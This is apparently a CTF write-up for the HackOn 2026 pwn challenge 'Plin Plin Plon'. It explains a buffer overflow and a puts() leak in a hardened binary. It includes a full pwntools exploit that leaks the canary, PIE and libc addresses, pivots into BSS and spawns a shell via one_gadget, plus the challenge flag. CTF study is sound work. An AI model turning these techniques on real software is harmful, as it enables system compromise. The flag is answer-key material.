# Plin Plin Plon - HackOn CTF 2026

**Category:** PWN
**Points:** ???
**Flag:** `HackOn{p4rry_pl1n_pl0n_pl1n}`

## Description

> Se nos proporciona un binario ELF x86_64 junto con la libc y el loader del servidor.

## Analysis

### Protections

```
$ checksec vuln
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

All protections enabled, including **Full RELRO** (read-only GOT).

### Reversing

The binary is simple. The `plin()` function contains the vulnerability:

```c
void plin() {
    char buf[0x58];

    while (1) {
        read(0, buf, 0x80);  // Buffer overflow. Reads 0x80 into 0x58 buffer
        if (strcmp(buf, "plin plin plon") == 0)
            break;
        puts(buf);  // Info leak
    }
}
```

**Vulnerabilities:**
1. **Buffer overflow**: `read()` reads 0x80 bytes into a 0x58 buffer, allowing overwrite of canary, saved rbp and return address
2. **Info leak**: `puts()` prints until null byte, allowing canary and address leaks

### Stack layout

```
[rbp-0x60]: buf[0x58]     <- read writes here
[rbp-0x08]: canary
[rbp+0x00]: saved rbp
[rbp+0x08]: return address
```

## Exploitation

### Step 1: Canary leak

We send 0x59 bytes to overwrite the canary's null byte. `puts()` will print the full buffer plus the 7 remaining canary bytes.

```python
p.send(b'A' * 0x59)
leak = p.recvline()[:-1]
canary = u64(b'\x00' + leak[0x59:0x60])
```

### Step 2: PIE leak

We send 0x69 bytes to reach the return address. The low byte of `main+0x1c` is `0xbb`, which we overwrite, but the next 5 bytes leak.

```python
p.send(b'B' * 0x69)
leak = p.recvline()[:-1]
pie_base = u64(b'\xbb' + leak[0x69:0x6e] + b'\x00\x00') - 0x12bb
```

### Step 3: Stack pivot for libc leak

Here's the main trick. With **Full RELRO**, the GOT is read-only, so we can't do GOT overwrite. However, the BSS section is writable and contains libc pointers:

```
.bss:
    0x4020: stdout  -> _IO_2_1_stdout_ (libc)
    0x4030: stdin   -> _IO_2_1_stdin_  (libc)
    0x4040: stderr  -> _IO_2_1_stderr_ (libc)
```

**Strategy:**
1. Exit the loop with "plin plin plon"
2. Overwrite saved_rbp with `stdout + 0x60`
3. Return to gadget at 0x1279:
   ```asm
   lea    -0x60(%rbp), %rax   ; rax = stdout
   mov    %rax, %rdi
   call   puts@plt            ; puts(stdout) -> leak libc!
   jmp    0x1249              ; back to the loop
   ```
4. Now `read()` writes to `stdout` (writable BSS), not to the GOT

```python
stdout_addr = pie_base + 0x4020
fake_rbp = stdout_addr + 0x60
gadget = pie_base + 0x1279

payload = b'plin plin plon\x00' + b'X' * (0x58 - 15)
payload += p64(canary)
payload += p64(fake_rbp)
payload += p64(gadget)
p.send(payload)

# Receive libc leak
leak = p.recv(8)
stdout_libc = u64(leak[:6].ljust(8, b'\x00'))
libc_base = stdout_libc - libc.symbols['_IO_2_1_stdout_']
```

### Step 4: ROP with one_gadget

Now the program waits for input at `read(0, stdout, 0x80)`. We send:
- "plin plin plon" to exit the loop
- Correct canary
- Valid RBP (needed for one_gadget constraints)
- one_gadget address

```python
good_rbp = pie_base + 0x4100  # Writable address for constraints
one_gadget = libc_base + 0xebd3f

payload2 = b'plin plin plon\x00' + b'Y' * (0x58 - 15)
payload2 += p64(canary)
payload2 += p64(good_rbp)
payload2 += p64(one_gadget)
payload2 += b'\x00' * (0x80 - len(payload2))
p.send(payload2)
```

The one_gadget `0xebd3f` has constraints:
```
0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
```

With `rbp = pie_base + 0x4100`, all addresses `rbp-0x48`, `rbp-0x50`, `rbp-0x70` are in BSS (writable), satisfying the constraints.

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def exploit():
    p = remote('0.cloud.chals.io', 17414)

    # Leak canary
    p.send(b'A' * 0x59)
    leak1 = p.recvline()[:-1]
    canary = u64(b'\x00' + leak1[0x59:0x60])

    # Leak PIE
    p.send(b'B' * 0x69)
    leak2 = p.recvline()[:-1]
    pie_base = u64(b'\xbb' + leak2[0x69:0x6e] + b'\x00\x00') - 0x12bb

    # Pivot to BSS for libc leak
    stdout_addr = pie_base + 0x4020
    fake_rbp = stdout_addr + 0x60
    gadget = pie_base + 0x1279

    payload1 = b'plin plin plon\x00' + b'X' * (0x58 - 15)
    payload1 += p64(canary) + p64(fake_rbp) + p64(gadget)
    p.send(payload1)

    # Get libc leak
    leak = p.recv(8)
    libc_base = u64(leak[:6].ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']

    # ROP with one_gadget
    good_rbp = pie_base + 0x4100
    one_gadget = libc_base + 0xebd3f

    payload2 = b'plin plin plon\x00' + b'Y' * (0x58 - 15)
    payload2 += p64(canary) + p64(good_rbp) + p64(one_gadget)
    payload2 += b'\x00' * (0x80 - len(payload2))
    p.send(payload2)

    p.interactive()

exploit()
```

## Execution

```
$ python3 solve.py
[*] Canary: 0xc8a3a7736ce35e00
[*] PIE base: 0x56329f098000
[+] libc base: 0x7f01cd061000
[+] Flag: HackOn{p4rry_pl1n_pl0n_pl1n}
```

## Conclusion

The challenge combines several techniques:
- **Info leak** through `puts()` without null terminator
- **Stack pivot** to redirect execution flow
- **BSS pivot** as an alternative to GOT overwrite when Full RELRO is present
- **One_gadget** to get a shell without needing complex ROP chains

The key insight was realizing that although the GOT is read-only, BSS contains libc pointers (stdout/stdin/stderr) and is writable, enabling the libc leak and final payload execution.
